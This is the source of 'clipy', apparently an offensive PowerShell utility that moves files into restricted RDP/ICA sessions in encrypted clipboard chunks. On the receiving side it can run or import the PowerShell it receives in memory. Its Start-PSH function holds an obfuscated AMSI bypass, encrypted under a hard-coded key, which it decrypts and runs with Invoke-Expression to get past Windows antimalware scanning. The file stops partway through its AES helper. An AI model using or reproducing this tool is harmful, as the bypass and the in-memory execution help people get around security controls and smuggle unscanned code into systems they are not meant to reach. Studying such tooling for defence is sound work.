function Invoke-Clipy {
    <#
    .SYNOPSIS
    clipy is a Powershell tool to help you copy/paste files via RDP/ICA.
    
    .DESCRIPTION
    clipy can help you copy/paste files into restricted remote desktop environments, e.g. via RDP/ICA, where it is not possible to copy files directly to it and copy/paste of ASCII via the clipboard is the only way.
    
    .PARAMETER Action
    Select if clipy is in _Sender_ or _Receiver_ mode or use _CryptFileWrite_ and _CryptFileRead_ to build an AES encrypted output file or read it back in again.

    .PARAMETER InputFile
    Filepath of the input file you want to read.

    .PARAMETER OutputFile
    Filepath of the output file you want to write to.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER maxSize
    Fine tune the base64 chunk size to your needs, 2MB are default. Possible values are "0.1MB", "0.25MB", "0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB".
    
    .PARAMETER PSH
    Use 'Import' if you want to import Powershell fuctions, or 'Execute' if you want to execute the Powershell code directly.

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass of clipy on receiver side.

    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe"
    
    Description
    -----------
    clipy reads the source file "source-file.exe" and splits it in 2MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe" -maxSize 1.4MB
    
    Description
    -----------
    clipy reads the source file "source-file.exe" and splits it in 1.4MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action Send -InputFile "source-file.exe" -AESKey "Secr3tP8ssw0rd!" -maxSize 4MB
    
    Description
    -----------
    clipy reads the source file "source-file.exe", use a specific AES encryption key instead of the default one and splits it in 4MB chunks.
    
    .EXAMPLE
    Invoke-Clipy -Action CryptFileWrite -InputFile "source-file.ps1" -OutputFile "crypted-ps1.txt"
    
    Description
    -----------
    clipy reads the source file "source-file.ps1" and stores it as AES encrypted output file.

    .EXAMPLE
    Invoke-Clipy -Action Receive -OutputFile "target-file.exe"
    
    Description
    -----------
    clipy writes the received file as "target-file.exe".

    .EXAMPLE
    Invoke-Clipy -Action Receive -OutputFile "target-file.exe" -AESKey "Secr3tP8ssw0rd!" -Force
    
    Description
    -----------
    clipy writes the received file as "target-file.exe", use a specific AES decryption key instead of the default one and force overwriting the target file if it is existing already.

    .EXAMPLE
    Invoke-Clipy -Action Receive -PSH Execute -AMSI
    
    Description
    -----------
    Clipy executes an AMSI bypass before it executes the received Powershell file.

    .EXAMPLE
    Invoke-Clipy -Action Receive -PSH Import -AMSI -AESKey "Secr3tP8ssw0rd!"
    
    Description
    -----------
    Clipy executes an AMSI bypass before it imports the modules of the received Powershell file and uses a specific AES decryption key instead of the default one.

    .EXAMPLE
    Invoke-Clipy -Action CryptFileRead - InputFile "crypted-ps1.txt" -PSH Import -AMSI
    
    Description
    -----------
    Clipy executes an AMSI bypass before it imports the modules of the AES encrypted Powershell input file.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, HelpMessage="Use 'Send' or 'Receive' to either send or receive a file")]
        [ValidateSet("Send", "Receive", "CryptFileWrite", "CryptFileRead")]
        [String] $Action,

        [Parameter(Mandatory = $false, HelpMessage="Use your own AES key for encryption")]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false, HelpMessage="Use 'InputFile' to point to the file you want to read")]
        [ValidateNotNullOrEmpty()]
        [string] $InputFile,

        [Parameter(Mandatory = $false, HelpMessage="Use 'OutputFile' to point to the file you want towrite")]
        [ValidateNotNullOrEmpty()]
        [string] $OutputFile,

        [Parameter(Mandatory = $false, HelpMessage="Force overwriting an existing file")]
        [switch] $Force,

        [Parameter(Mandatory = $false, HelpMessage="Fine tune the base64 chunk size to your needs, 2MB are default")]
        [ValidateSet("0.1MB", "0.25MB","0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB")]
        $maxSize,

        [Parameter(Mandatory = $false, HelpMessage="Use 'Import' if you want to import Powershell fuctions, or 'Execute' if you want to execute the Powershell code directly")]
        [ValidateSet("Execute", "Import")]
        [String] $PSH,

        [Parameter(Mandatory = $false, HelpMessage="Executes an AMSI bypass on receiver side")]
        [switch] $AMSI
    )

    # show clipy logo
    $clipyVersion = '0.1.0'
    Get-ANSI -Color Blue -Value $clipyVersion -Logo

    # build the arguments
    $CopyToClipArguments = @{}
    $CopyFromClipArguments = @{}
    if ($PSBoundParameters['InputFile']) { $CopyToClipArguments['FilePath'] = $InputFile }
    if ($PSBoundParameters['OutputFile']) { $CopyFromClipArguments['FilePath'] = $OutputFile }
    if (-not $PSBoundParameters['AESKey']) { $AESKey = "YC/gwssk57j:QFNvFH,Tq52a" } ; $CopyToClipArguments['AESKey'] = $AESKey ; $CopyFromClipArguments['AESKey'] = $AESKey
    if ($PSBoundParameters['maxSize']) { $CopyToClipArguments['maxSize'] = $maxSize }
    if ($PSBoundParameters['PSH']) { $CopyFromClipArguments['PSH'] = $PSH }
    if ($PSBoundParameters['Force']) { $CopyToClipArguments['Force'] = $true ; $CopyFromClipArguments['Force'] = $true }
    if ($PSBoundParameters['AMSI']) { $CopyFromClipArguments['AMSI'] = $true }

    if ($Action -eq "Send") {
        if (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } else {
            Send-ClipValue @CopyToClipArguments
        }
        
    } elseif ($Action -eq "Receive") {
        if ($(-not $OutputFile) -and $(-not $PSH)) {
            Write-Host -ForegroundColor Red "Neither parameter -OutputFile nor -PSH provided"
        } else {
            Get-ClipValue @CopyFromClipArguments
        }
        
    } elseif ($Action -eq "CryptFileWrite") {
        if (-not $OutputFile) {
            Write-Host -ForegroundColor Red "No parameter -OutputFile provided"
        } elseif (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } else {
            Send-ClipValue @CopyToClipArguments -CryptFileOut $OutputFile -maxSize 100MB
        }

    } elseif ($Action -eq "CryptFileRead") {
        if (-not $InputFile) {
            Write-Host -ForegroundColor Red "No parameter -InputFile provided"
        } elseif (-not $PSH) {
            Write-Host -ForegroundColor Red "No parameter -PSH provided"
        } else {
            Get-ClipValue @CopyFromClipArguments -CryptFileIn $InputFile
        }
    }
}

function Send-ClipValue {
    <#
    .DESCRIPTION
    Helper function. Takes an input file, do compression, base64 encoding and AES encrypting. The result is either be splitted in chunks and provided to the clipboard or directly stored in an output file for further usage.
    
    .PARAMETER FilePath
    Filepath of the input file you want to read.

    .PARAMETER CryptFileOut
    Filepath of the crypted output file you want to write to. If this parameter is set, no splitted chunks will created to be used via clipboard but directly stored in a single file.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER maxSize
    Fine tune the base64 chunk size to your needs, 2MB are default. Possible values are "0.1MB", "0.25MB", "0.5MB", "1MB", "1.4MB", "1.6MB", "1.8MB", "2MB", "2.5MB", "4MB", "6MB", "8MB", "10MB", "20MB", "50MB".
    #>
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileOut,

        [Parameter(Mandatory = $false)]
        [switch] $Force,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory=$false)]
        [int] $maxSize = 2MB
    )

    $WriteClipyFileArguments = @{}
    if ($PSBoundParameters['CryptFileOut']) { $WriteClipyFileArguments['FilePath'] = $CryptFileOut }
    if ($PSBoundParameters['Force']) { $WriteClipyFileArguments['Force'] = $true }

    if (Test-Path -Path $FilePath) {
        # get file
        $inputFileHash = Read-ClipyFile -FilePath $FilePath -GetHash
        $contentRaw = Read-ClipyFile -FilePath $FilePath -Format Binary

        # compress and base64 encode input
        Write-Host "Doing some compressing and encrypting tasks. This can take some time..."
        $contentBlob = Get-CompressedByteArray -byteArray $contentRaw

        Write-Verbose "[Send-ClipValue] Do Base64 encoding of data..."
        $contentBlobB64 = [System.Convert]::ToBase64String($contentBlob)

        Write-Verbose "[Send-ClipValue] Do AES encrypting of data..."
        $contentBase64 = Invoke-AESEncryption -Mode Encrypt -Key $AESKey -Text $contentBlobB64

        # create some variables
        $chunksCompleteLength = $([Math]::Round($($contentBase64.Length / 1KB), 2))
        $chunkNumbers = $([Math]::Ceiling($contentBase64.Length / $maxSize))
        if ($chunkNumbers -eq 1) {$chunkName = "chunk"} else {$chunkName = "chunks"}
        $chunkNumber = 1
        $chunkHeader = "##"
        $chunkSplit = "."

        if ($CryptFileOut) {
            try {
                Write-Host "Trying to write encrypted payload with $chunksCompleteLength KByte to '$CryptFileOut' in $(Get-ANSI -Color Blue -Value $chunkNumbers) $chunkName ($($maxSize / 1MB) MByte chunk size)"
                # build hash of input
                $contentHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$chunkNumbers+$chunkNumber+$contentBase64))
                $contentHash = [System.BitConverter]::ToString($contentHashBlob).Replace("-","").ToLower()

                # put header to payload and write the file
                $contentPayload = $chunkHeader + $chunkSplit + $chunkNumbers + $chunkSplit + $chunkNumber + $chunkSplit + $contentHash + $chunkSplit + $contentBase64
                Write-ClipyFile @WriteClipyFileArguments -asString  $contentPayload
            } catch {
                Write-Error "[Send-ClipValue] Error writing encrypted content: $_"
            }

        } else {
            # split the input
            Write-Host "Splitting payload with $chunksCompleteLength KByte to Clipboard in $(Get-ANSI -Color Blue -Value $chunkNumbers) $chunkName ($($maxSize / 1MB) MByte chunk size)"
            Write-Verbose "[Send-ClipValue] Start splitting the data..."
            for($i = 0; $i -lt $contentBase64.Length) {
                # calculate chunk length and hash of it
                $subString = $contentBase64.Substring($i, ([Math]::Min($maxSize,$contentBase64.Length - $i)))
                $subStringHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$chunkNumbers+$chunkNumber+$subString))
                $subStringHash = [System.BitConverter]::ToString($subStringHashBlob).Replace("-","").ToLower()

                # put chunk header to payload
                $chunkPayload = $chunkHeader + $chunkSplit + $chunkNumbers + $chunkSplit + $chunkNumber + $chunkSplit + $subStringHash + $chunkSplit + $subString
                $chunkPayload | Set-Clipboard

                if ($i + $maxSize -lt $contentBase64.Length) {
                    $text = "Press any key for next chunk. [R] to repeat"
                } else {
                    $text = "Press any key to finish. [R] to repeat"
                }

                $chunkSize = $([Math]::Round($($subString.Length / 1KB), 2))
                $key = Read-Host -Prompt "Chunk $(Get-ANSI -Color Blue -Value $chunkNumber) ($chunkSize KBytes) of $(Get-ANSI -Color Blue -Value $chunkNumbers) with hash $(Get-ANSI -Color Blue -Value $subStringHash). $text"
                if ($key -ne 'R') {
                    $i += $maxSize
                    $chunkNumber +=1
                }
            }
            Write-Host "$(Get-ANSI -Color Green -Value "Finished") all chunks of the file with SHA256 hash $(Get-ANSI -Color Green -Value $inputFileHash.Hash)"
        }
    } else {
        Write-Host "File '$FilePath' does not exist" -ForegroundColor Red
    }
}

function Get-ClipValue {
    <#
    .DESCRIPTION
    Helper function. Reads AES encrypted clipy content either via clipboard or encrpyted input file. After successful reading data via clipboard it stores the decrypted content to an output file.
    If the input was either Powershell code via clipboard or an encrpyted input file, it can import the included Powershell modules or execute the code in the Powershell process directly.
    
    .PARAMETER FilePath
    Filepath of the output file you want to write to.

    .PARAMETER CryptFileIn
    Filepath of the AES encrypted clipy input file you want to read.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    
    .PARAMETER PSH
    Use 'Import' if you want to import Powershell fuctions, or 'Execute' if you want to execute the Powershell code directly.

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass of clipy on receiver side.
    #>
    param (
        [Parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileIn,

        [Parameter(Mandatory = $false)]
        [switch] $Force,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false)]
        [ValidateSet("Execute", "Import")]
        [String] $PSH,

        [Parameter(Mandatory = $false)]
        [switch] $AMSI
    )

    # build the arguments
    $StartPSHArguments = @{}
    if ($PSBoundParameters['AMSI']) { $StartPSHArguments['AMSI'] = $true }
    $GetClipInputArguments = @{}
    if ($PSBoundParameters['AESKey']) { $GetClipInputArguments['AESKey'] = $AESKey }
    if ($PSBoundParameters['CryptFileIn']) { $GetClipInputArguments['CryptFileIn'] = $CryptFileIn }
    $WriteClipyFileArguments = @{}
    if ($PSBoundParameters['FilePath']) { $WriteClipyFileArguments['FilePath'] = $FilePath }
    if ($PSBoundParameters['Force']) { $WriteClipyFileArguments['Force'] = $true }

    if ($PSH) {
        $pshCode = [System.Text.Encoding]::ASCII.GetString($(Get-ClipyInput @GetClipInputArguments))

        if ($PSH -eq "Import") {
            Start-PSH -Code $pshCode -Action Import @StartPSHArguments
        } elseif ($PSH -eq "Execute") {
            Start-PSH -Code $pshCode -Action Execute @StartPSHArguments
        } else {
            Throw "Something strange happended with parameter -PSH....EXIT"
        }

    } elseif ($CryptFileIn) {
        Write-Host -ForegroundColor Red "You have to use parameter -PSH to execute an encrypted clipy file!"

    } else {
        # get data with cmdlet Get-Input
        try {
            $output = Get-ClipyInput -AESKey $AESKey
            if ($output) { Write-ClipyFile @WriteClipyFileArguments -asByte $output }
        } catch {
            Write-Error "[Get-ClipValue] Error writing received content: $_"
        }
    }
}

function Get-ClipyInput {
    <#
    .DESCRIPTION
    Helper function. Reads AES encrypted clipy content either via clipboard or encrpyted input file.

    .PARAMETER CryptFileIn
    Filepath of the AES encrypted clipy input file you want to read.
    
    .PARAMETER AESKey
    Use your own AES key for encryption and decryption instead of the pre-defined own of clipy.
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $AESKey,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $CryptFileIn
    )

    $content = ""
    $chunkNumber = 1

    if (-not $CryptFileIn) { Write-Host "Waiting for incoming chunks..." }
    
    # change input of while loop to 'read clipboard' or 'read cryptfile'
    while(![System.String]::IsNullOrEmpty($(if ($CryptFileIn) {($ClipInputRaw = Read-ClipyFile -FilePath $CryptFileIn -Format Text)} else {($ClipInputRaw = Get-Clipboard -Format Text -TextFormatType Text)}))) {
        $ClipInput = $ClipInputRaw.split(".")
        <#
        $ClipInput[0] = Clipy header: ##
        $ClipInput[1] = Total number of chunks
        $ClipInput[2] = Single chunk number
        $ClipInput[3] = SHA1 hash of 'AESKey+$ClipInput[1]+$ClipInput[2]+$ClipInput[4]'
        $ClipInput[4] = Payload
        #>

        # check if the inputs fits to our clipy headers
        if ($ClipInput.Count -eq 5) {
            if ($ClipInput[0] -eq "##" -and $ClipInput[1] -match "\d+$" -and $ClipInput[2] -match "\d+$" -and $ClipInput[3].length -eq 40) {
                $subStringHashBlob = [System.Security.Cryptography.HashAlgorithm]::Create("sha1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($AESKey+$ClipInput[1]+$ClipInput[2]+$ClipInput[4]))
                $subStringHash = [System.BitConverter]::ToString($subStringHashBlob).Replace("-","").ToLower()

                # check if received hash matches our calculated one
                if ($ClipInput[3] -eq $subStringHash) {
                    $base64 = $ClipInput[4]

                    if ($chunkNumber -eq $ClipInput[2] -and $chunkNumber -le $ClipInput[1]) {
                        if (-not $CryptFileIn) { Write-Host "Successfully read chunk $(Get-ANSI -Color Blue -Value $ClipInput[2]) of $(Get-ANSI -Color Blue -Value $ClipInput[1]) with ($([Math]::Round($($base64.Length / 1KB), 2)) KBytes): hash $(Get-ANSI -Color Blue -Value $subStringHash)"}
                        $content += $base64
                        $chunkNumber += 1

                        # if everything seems ok let's finish or proceed
                        if ($chunkNumber -gt $ClipInput[1]) {
                            Write-Host "Successfully read the complete content, proceeding further..."
                            break
                        }
                    } else {
                        Write-Host "Received chunk $(Get-ANSI -Color Red -Value $ClipInput[2]) of $(Get-ANSI -Color Blue -Value $ClipInput[1]) but need chunk $(Get-ANSI -Color Blue -Value $chunkNumber), please try again."
                    }
                    $text = "Press any key for next chunk. [F] to finish"
                    $key = Read-Host -Prompt $text

                    if ($key -eq "F") {
                        Write-Host -ForegroundColor Red "You did not receive to complete content and the data proceed with will be damaged..."
                        break
                    }

                } else {
                    if ($CryptFileIn) {
                        write-verbose "[Get-ClipyInput] Partial content of file: $($ClipInputRaw.substring(0,40))..."
                        Throw "The content of '$CryptFileIn' could not be decrypted. Either the file is corrupted or you used the wrong AES key!"
                    } else {
                        write-verbose "[Get-ClipyInput] Partial content of clipboard: $($ClipInputRaw.substring(0,40))..."
                        $text = "Received a damaged chunk, consider to set a smaler -maxSize parameter, press any key and try again!"
                        Read-Host -Prompt $text | Out-Null
                    }
                }
            }
        }
        else {
            if ($CryptFileIn) {
                Throw "The content of '$CryptFileIn' is no valid crypted clipy file!"
            } else {
                write-verbose "[Get-ClipyInput] Content of clipboard: $($ClipInputRaw.substring(0,$ClipInputRaw.length))"
                $text = "There was something in the clipboard but that was no valid chunk, press any key and try again!"
                Read-Host -Prompt $text | Out-Null
            }
        }
    }

    # AES decrypt, base64 decode and decompress imported data
    try {
        Write-Verbose "[Get-ClipyInput] Do AES decrypting of data..."
        $outputBlobB64 = Invoke-AESEncryption -Mode Decrypt -Key $AESKey -Text $content

        try {
            Write-Verbose "[Get-ClipyInput] Do Base64 decoding of data..."
            $outputBlob = $([System.Convert]::FromBase64String($outputBlobB64))

            try {
                $output = Get-DecompressedByteArray -byteArray $outputBlob
                return $output

            } catch {
                Write-Error "[Get-ClipyInput] Error decompressing Base64 blob: $_"
                break
            }
        } catch {
            Write-Error "[Get-ClipyInput] Error decrypting AES stream: $_"
            break
        }
    } catch {
        Write-Error "[Get-ClipyInput] Error decrypting AES stream: $_"
        break
    }
}

function Write-ClipyFile {
    <#
    .DESCRIPTION
    Helper function to write clipy content to a file.
    
    .PARAMETER FilePath
    Filepath of the output file you want to write.

    .PARAMETER Force
    Force overwriting an existing file.
    
    .PARAMETER asString
    Stores the output as text.
    
    .PARAMETER asByte
    Stores the output in binary format.
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string] $asString,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $asByte,

        [Parameter(Mandatory = $false)]
        [switch] $Force
    )

    if ($FilePath) {

        if ($(-not $asByte) -and $(-not $asString)) {
            Throw "Unable to write to a file without any input!"
        } elseif ($asByte -and $asString) {
            Throw "You have to specify the content type!"
        }

        try {
            if (!(Test-Path -Path $FilePath) -or $Force -or ((Read-Host -Prompt "File '$FilePath' already exists. Overwrite? (Y/N)") -eq "Y")) {
                Set-Content -Path $FilePath -value "" -ErrorAction Stop
                $FilePath = Resolve-Path $FilePath
            } else {
                break
            }
        } catch {
            Write-Host "Could not write to file '$FilePath': $_"
            break
        }

        if ($asByte) {
            Write-Verbose "[Write-ClipyFile] Writing data to output file '$FilePath' as 'ByteArray'"
            [io.file]::WriteAllBytes($FilePath,$asByte)
            
        } elseif ($asString) {
            Write-Verbose "[Write-ClipyFile] Writing data to output file '$FilePath' as 'Text'"
            [io.file]::WriteAllText($FilePath,$asString)
        }

        $FileHash = Read-ClipyFile -FilePath $FilePath -GetHash
        Write-Host "$(Get-ANSI -Color Green -Value "Finished"), SHA256 hash of written file is $(Get-ANSI -Color Green -Value $FileHash.Hash)"
    }
}

function Read-ClipyFile {
    <#
    .DESCRIPTION
    Helper function to read content from a file.
    
    .PARAMETER FilePath
    Filepath of the input file you want to read.
    
    .PARAMETER GetHash
    Calculates a SHA256 hash of the input file.
    
    .PARAMETER Format
    Format of return value of this function. Either plain text as string or binary as ByteArray
    #>
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string] $FilePath,

        [Parameter(Mandatory = $false)]
        [switch] $GetHash,

        [Parameter(Mandatory = $false)]
        [ValidateSet("Text", "Binary")]
        [string] $Format = "Text"
    )

    if ($FilePath) {
        if (Test-Path -Path $FilePath) {
            $FilePath = Resolve-Path $FilePath
            Write-Verbose "[Read-ClipyFile] Resolved full file path as '$FilePath'"
            
            if ($GetHash) {
                Write-Verbose "[Read-ClipyFile] Get Hash of file '$FilePath'"
                $FilePathHash = Get-FileHash -Algorithm SHA256 -Path $FilePath
                Return $FilePathHash

            } else {
                $FilePathLength = $([Math]::Round($((Get-Item $FilePath).length/ 1KB), 2))
                Write-Host "Reading input file $(Get-ANSI -Color Blue -Value $FilePath) with $FilePathLength KByte raw data"

                if ($Format -eq "Text") {
                    Write-Verbose "[Read-ClipyFile] Reading input file '$FilePath' as 'Text'"
                    $contentRaw = [io.file]::ReadAllText($FilePath)
                } else {
                    Write-Verbose "[Read-ClipyFile] Reading input file '$FilePath' as 'ByteArray'"
                    $contentRaw = [io.file]::ReadAllBytes($FilePath)
                }

                if ($contentRaw) {
                    Return  $contentRaw
                } else {
                    Throw "There was no data in file '$FilePath'"
                }
            }
            
        } else {
            Throw "Could not access the provided input file '$FilePath'"
        }
    }
}

function Start-PSH {
    <#
    .DESCRIPTION
    Helper function. Execute given Powershell code either directly or import its modules.
    
    .PARAMETER Code
    Powershell code that will be executed or imported.

    .PARAMETER Action
    Use 'Import' if you want to import Powershell fuctions, or 'Execute' if you want to execute the Powershell code directly. Defaults to "Execute"

    .PARAMETER AMSI
    "Executes an pre-build AMSI bypass of clipy on receiver side.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [string] $Code,

        [Parameter(Mandatory=$false)]
        [ValidateSet("Execute", "Import")]
        [string] $Action = "Execute",

        [Parameter(Mandatory = $false)]
        [switch] $AMSI
    )
    PROCESS {
        if ($Code) {

            <# Some AMSI Things :-)
            Example how to build this
            $b0 = [io.file]::ReadAllBytes((resolve-path "amsi.txt"))
            $b1 = Get-CompressedByteArray -byteArray $b0
            $b2 = [System.Convert]::ToBase64String($b1)
            $b3 = Invoke-AESEncryption -Mode Encrypt -Key "foobar" -Text $b2
            Now use the content of $b3 as content for $a0 below
            #>
            $a0 = "tXcCpb/ADCdUpvizNlqTAbVSYHKbC1Pl47Smgq69A4F3sNw/L+gG9NGaopTUQijBbOpbHT8vtyGhJqFzqONiev0LGQ4+IVWGf06V8bd/wOtEE4toJ54h8XTgpY18etNBoQQVAgw2yfhJZvJ/7GnECEt/I/gaG0P9zOx8j4xHg9WRP5OvS19i/9JTwmij8CzDR2A6GsWdf/k/E64KhgWLSSmSbmmUabH+1axPDNvjA4Gykzc+8q8o+w2h7lq3f+6wNxPTxS5ZIDr8UXO1qt+YvOY9YjvAwNJIDpTgkfPTiwZmGJv9P5qvl0bEsCn/F4GSMXh8v+mK4x/U4A4X6Ya7Bji/+f1P/0vnhpY8ePZhgyXw7p31aEESndSiD0FGCbzTXHKBUiKz1AotZRBUrGxA+7cO3JDlFfPTqkDxpA70MHqHTJZN3xcCJI/4L7YKK94j392GphaxYTd14LN/cVb1coRWCqvvJrXfJ9XGt/wYNYk="
            $a1 = Invoke-AESEncryption -Mode Decrypt -Key "foobar" -Text $a0
            $a2 = $([System.Convert]::FromBase64String($a1))
            $a3 = Get-DecompressedByteArray -byteArray $a2
            $a4 = [System.Text.Encoding]::ASCII.GetString($a3)
            
            if ($AMSI) {
                try {
                    Write-Host "Trying to play with AMSI..."
                    Invoke-Expression -Command $a4
                    Write-Host "Done!"
                } catch {
                    Write-Host "AMSI bypass was not successful: $_"
                }
            }

            if ($Action -eq "Import") {
                $PshModule = [ScriptBlock]::Create($Code)
                Write-Host "Trying to start Import-Module with the provided data..."
                New-Module -ScriptBlock $PshModule -name Invoke-PshClipy | Import-Module
                Write-Host "Done!"
            } else {
                Write-Verbose "[Start-PSH] Content of provided file:`n$Code"
                Invoke-Expression -Command $Code
            }
        }
    }
}

function Get-ANSI {
    <#
    .DESCRIPTION
    Helper function. Create ANSI color codes and clipy logo.
    
    .PARAMETER Color
    ANSI color you want to use. Possible values are:
    "RedYellow", "Black", "Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "LightGrey", "DarkGrey"

    .PARAMETER Value
    Text value as string you want to get returned with color.

    .PARAMETER Logo
    Returns the clipy logo.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [ValidateSet("RedYellow", "Black", "Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "LightGrey", "DarkGrey")]
        [string] $Color,

        [Parameter(Mandatory=$true)]
        [string] $Value,

        [Parameter(Mandatory = $false)]
        [Switch] $Logo
    )

    BEGIN {
        # Set ANSI escape sequence for colored output
        $ANSI_esc = [char]27
        $ANSI_Table = @{
        "RedYellow" = $ANSI_esc+"[1;31;103m"
        "Black" =  $ANSI_esc+"[1;30m"
        "Red" = $ANSI_esc+"[1;31m"
        "Green" =  $ANSI_esc+"[1;32m"
        "Yellow" =  $ANSI_esc+"[1;33m"
        "Blue" = $ANSI_esc+"[1;34m"
        "Magenta" = $ANSI_esc+"[1;35m"
        "Cyan" = $ANSI_esc+"[1;36m"
        "LightGrey" = $ANSI_esc+"[1;37m"
        "DarkGrey" = $ANSI_esc+"[1;90m"
        "Reset" = $ANSI_esc+"[0m"
        }

        # Build logo
        if ($Logo -eq $True) {
            $legend_logo_start = $ANSI_Table["Blue"]
            $legend_logo_stop = $ANSI_Table["Reset"]
            $Value = @"
$legend_logo_start
       _ _             
      | (_)            
   ___| |_ _ __  _   _ 
  / __| | | '_ \| | | |
 | (__| | | |_) | |_| |
  \___|_|_| .__/ \__, |
          | |     __/ |
          |_|    |___/ 
                    Version $Value
$legend_logo_stop
 Clipboard Transfer Utility
 by @61106960

"@
        }
    }

    PROCESS {
        $OutputValue = $ANSI_Table[$Color]+$Value+$ANSI_Table["Reset"]
        Return $OutputValue
    }
}

function Get-CompressedByteArray {
    <#
    .DESCRIPTION
    Helper function. Compress a provided ByteArray and return as ByteArray.
    
    .PARAMETER byteArray
    Input value that will be compressed. Must be in the format ByteArray.
    #>
	[CmdletBinding()]
    Param (
	    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )

	Process {
        Write-Verbose "[Get-CompressedByteArray] Compressing incoming data..."
       	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
      	$gzipStream.Write( $byteArray, 0, $byteArray.Length )
        $gzipStream.Close()
        $output.Close()
        $outputData = $output.ToArray()
        Write-Verbose "[Get-CompressedByteArray] Compressing done"
        Return $outputData
    }
}

function Get-DecompressedByteArray {
    <#
    .DESCRIPTION
    Helper function. Decompress a provided ByteArray and return as ByteArray.
    
    .PARAMETER byteArray
    Input value that will be decompressed. Must be in the format ByteArray.
    #>
	[CmdletBinding()]
    Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )
	
    Process {
	    Write-Verbose "[Get-DecompressedByteArray] Decompressing incoming data..."
        $inputStream = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $inputStream, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo( $output )
        $gzipStream.Close()
		$inputStream.Close()
		[byte[]] $byteOutArray = $output.ToArray()
        Write-Verbose "[Get-DecompressedByteArray] Decompressing done"
        Return $byteOutArray
    }
}

function Invoke-AESEncryption {
    <#
    .DESCRIPTION
    Helper function. Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
    
    .PARAMETER Mode
    Encryption or Decryption Mode
    
    .PARAMETER Key
    Key used to encrypt or decrypt
    
    .PARAMETER Text
    String value to encrypt or decrypt
    
    .PARAMETER Path
    Filepath for file to encrypt or decrypt
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
    
    Description
    -----------
    Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
    
    Description
    -----------
    Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
    
    Description
    -----------
    Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
    
    Description
    -----------
    Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
    #>
    [CmdletBinding()]
    [OutputType([string])]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String] $Mode,

        [Parameter(Mandatory = $true)]
        [String] $Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String] $Text,

